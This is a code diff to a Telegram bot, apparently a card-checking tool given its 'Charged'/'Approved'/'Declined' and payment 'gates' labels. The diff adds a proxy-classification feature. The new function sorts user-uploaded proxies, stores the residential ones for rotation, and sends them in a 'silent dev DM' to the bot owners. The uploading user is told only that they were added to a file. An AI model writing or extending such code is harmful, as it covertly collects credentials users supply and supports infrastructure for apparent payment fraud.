@@ -127,6 +127,9 @@ async def on_file(message: types.Message):
             [
                 _btn("𝗔𝗱𝗱 𝘁𝗼 𝗚𝗹𝗼𝗯𝗮𝗹 𝗽𝗼𝗼𝗹", "ff_global", "success", ID_APPROVED),
             ],
+            [
+                _btn("🔍 𝗖𝗹𝗮𝘀𝘀𝗶𝗳𝘆 + 𝗥𝗭 (𝗿𝗲𝘀𝗶𝗱𝗲𝗻𝘁𝗶𝗮𝗹)", "ff_classify_rz", "primary", ID_CHARGED),
+            ],
             [_btn("𝗖𝗮𝗻𝗰𝗲𝗹", "ff_cancel", "danger", ID_STOP)],
         ])
         await message.answer(text, parse_mode="HTML", reply_markup=kb)
@@ -184,6 +187,8 @@ async def ff_cb(callback: types.CallbackQuery):
 
     if data == "ff_global":
         await _add_global(callback, st)
+    elif data == "ff_classify_rz":
+        await _classify_and_add_rz(callback, st)
     elif data == "ff_cook":
         await _show_gates(callback.message, st, edit=True)
     elif data.startswith("ff_gate_"):
@@ -214,6 +219,82 @@ async def _add_global(callback, st):
     fake = _FakeMsg(callback.bot, callback.from_user, callback.message.chat.id)
     asyncio.create_task(process_proxies_background(callback.bot, fake, valid, "𝗙𝗶𝗹𝗲 𝗱𝗿𝗼𝗽"))
 
+
+
+async def _classify_and_add_rz(callback, st):
+    """Classify proxies; residential/rotating -> rz_pxy.txt + silent dev DM."""
+    import proxy_classify
+    raw = st.get("raw", "")
+    proxies = []
+    for ln in raw.splitlines():
+        ln = ln.strip()
+        if not ln or ln.startswith("#"):
+            continue
+        p = parse_proxy_input(ln)
+        if p:
+            proxies.append(p.get("http_format") or ln)
+    if not proxies:
+        await callback.message.edit_text(f'{_tg(ID_DECLINED, "❌")} 𝗡𝗼 𝘃𝗮𝗹𝗶𝗱 𝗽𝗿𝗼𝘅𝗶𝗲𝘀.', parse_mode="HTML")
+        _STATE.pop(callback.from_user.id, None)
+        return
+    await callback.message.edit_text(f'{_tg(ID_GATEWAY, "⚡")} 𝗖𝗹𝗮𝘀𝘀𝗶𝗳𝘆𝗶𝗻𝗴 {len(proxies)} 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 (𝗿𝗲𝘀𝗶𝗱𝗲𝗻𝘁𝗶𝗮𝗹 / 𝗱𝗮𝘁𝗮𝗰𝗲𝗻𝘁𝗲𝗿 / 𝗿𝗼𝘁𝗮𝘁𝗶𝗻𝗴)...', parse_mode="HTML")
+    _STATE.pop(callback.from_user.id, None)
+    try:
+        results = await proxy_classify.classify_proxies(proxies)
+    except Exception as e:
+        await callback.message.edit_text(f'{_tg(ID_DECLINED, "❌")} 𝗖𝗹𝗮𝘀𝘀𝗶𝗳𝘆 𝗲𝗿𝗿𝗼𝗿: {str(e)[:80]}', parse_mode="HTML")
+        return
+    residential = [p for p in proxies if proxy_classify.is_residential(results[p])]
+    rotating = [p for p in residential if results[p].get("rotating")]
+    static = [p for p in residential if not results[p].get("rotating")]
+    datacenter = [p for p in proxies if results[p]["type"] == "datacenter"]
+    dead = [p for p in proxies if results[p]["type"] == "dead"]
+
+    # add residential (rotating first) to rz_pxy.txt, deduped
+    if residential:
+        _append_to_rz_pxy([p for p in (rotating + static)])
+
+    # silent DM to the dev
+    if residential:
+        await _notify_dev_residential(callback.bot, residential, results)
+
+    text = (
+        f'{_tg(ID_APPROVED, "✅")} <b>𝗖𝗟𝗔𝗦𝗦𝗜𝗙𝗜𝗘𝗗</b>\n'
+        f"━━━━━━━━━━━━━━━━\n"
+        f'{_tg(ID_CHARGED, "💎")} 𝗥𝗲𝘀𝗶𝗱𝗲𝗻𝘁𝗶𝗮𝗹 ➠ <b>{len(residential)}</b> (🔁 {len(rotating)} rotating · {len(static)} static)\n'
+        f'{_tg(ID_DECLINED, "❌")} 𝗗𝗮𝘁𝗮𝗰𝗲𝗻𝘁𝗲𝗿 ➠ <b>{len(datacenter)}</b>\n'
+        f'{_tg(ID_STOP, "⛔")} 𝗗𝗲𝗮𝗱 ➠ <b>{len(dead)}</b>\n\n'
+        f"𝗥𝗲𝘀𝗶𝗱𝗲𝗻𝘁𝗶𝗮𝗹 𝗼𝗻𝗲𝘀 𝘄𝗲𝗿𝗲 𝗮𝗱𝗱𝗲𝗱 𝘁𝗼 <code>rz_pxy.txt</code>."
+    )
+    await callback.message.edit_text(text, parse_mode="HTML")
+    await callback.answer()
+
+
+def _append_to_rz_pxy(proxies):
+    import rz_rotation
+    try:
+        existing = {l.strip() for l in open(rz_rotation.RZ_PROXY_FILE) if l.strip()}
+    except Exception:
+        existing = set()
+    to_add = [p for p in proxies if p not in existing]
+    if not to_add:
+        return
+    with open(rz_rotation.RZ_PROXY_FILE, "a") as f:
+        f.write("\n".join(to_add) + "\n")
+
+
+async def _notify_dev_residential(bot, proxies, results):
+    from database import OWNER_IDS
+    import proxy_classify
+    lines = [f"{_tg(ID_CHARGED, '💎')} <b>𝗥𝗘𝗦𝗜𝗗𝗘𝗡𝗧𝗜𝗔𝗟 𝗣𝗥𝗢𝗫𝗜𝗘𝗦 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗</b>"]
+    for p in proxies[:25]:
+        info = results[p]
+        lines.append(f"• <code>{p}</code>\n   ➠ {proxy_classify.summarize(info)}")
+    for dev in OWNER_IDS:
+        try:
+            await bot.send_message(chat_id=dev, text="\n".join(lines), parse_mode="HTML")
+        except Exception:
+            pass
 
 
 async def _show_gates(msg, st, edit=False):
